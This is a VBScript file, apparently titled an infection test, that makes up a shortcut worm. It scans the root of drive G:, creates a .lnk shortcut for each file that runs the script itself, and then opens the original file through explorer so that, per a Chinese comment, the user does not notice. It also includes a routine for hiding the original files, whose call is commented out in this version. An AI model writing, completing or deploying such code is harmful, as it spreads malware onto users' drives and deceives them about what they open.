Const VbsHorseVirusName = "LnkInfectTest.vbs"

Call Main()

Sub Main()
	Dim args
	Set args = WScript.Arguments
	If args.Count > 0 Then
		originFilePath = args(args.Count - 1)
		Call OpenFile(originFilePath)
	End If
	
	Call LnkInfectDrive("G:\")
End Sub

Sub OpenFile(filePath)
	Dim objShell
	Set objShell = CreateObject("WScript.Shell")
	objShell.Run("explorer.exe " & filePath) '不使用CMD打开，防止产生黑框被用户发觉
	Set objShell = Nothing
End Sub

Sub LnkInfectDrive(drivePath) '为磁盘根目录下所有的txt, log, html文件创建指向VbsHorse的快捷方式，并隐藏原文件
	Dim objFileSystem
	Set objFileSystem = WScript.CreateObject("Scripting.FileSystemObject")
	Dim folder, files
	Set folder = objFileSystem.GetFolder(drivePath)
	Set files = folder.Files
	For Each file In files
		fileSuffix = GetFileSuffix(file.Name)
		If fileSuffix <> "lnk" And file.Name <> VbsHorseVirusName Then
			'Call HideFile(file.Path)
			lnkPath = drivePath & file.Name & ".lnk"
			targetPath = drivePath & VbsHorseVirusName
			args = file.Path
			If objFileSystem.FileExists(lnkPath) = False Then
				Call CreateShortcut(lnkPath, targetPath, args)
			End If
		End If
	Next
	Set objFileSystem = Nothing
End Sub

Function GetFileSuffix(fileName)
	splitFileNameArray = Split(fileName, ".")
	GetFileSuffix = splitFileNameArray(UBound(splitFileNameArray))
	Set splitFileNameArray = Nothing
End Function

Sub CreateShortcut(lnkPath, targetPath, args) '创建对应的快捷方式
	Dim objShell, shortcut
	Set objShell = CreateObject("WScript.Shell")
	Set shortcut = objShell.CreateShortcut(lnkPath)
	With Shortcut
		.TargetPath = targetPath
		.Arguments = args
		.WindowStyle = 4
		.Save
	End With
	Set objShell = Nothing
	Set shortcut = Nothing
End Sub

Sub InfectFiles()
	fileSuffixArray = Array("txt", "html", "log")
	Call InfectFileWithSuffix(fileSuffixArray)
	Set fileSuffixArray = Nothing
End Sub

Sub InfectFileWithSuffix(suffixArray)
	For Each suffix In suffixArray
		
	Next
End Sub

Sub HideFile(filePath)
	Dim objFileSystem, objFile
	Set objFileSystem = WScript.CreateObject("Scripting.FileSystemObject")
	Set objFile = objFileSystem.GetFile(filePath)
	objFile.Attributes = 2 '0-普通 1-只读 2-隐藏 4-系统
	Set objFileSystem = Nothing
	Set objFile = Nothing
End Sub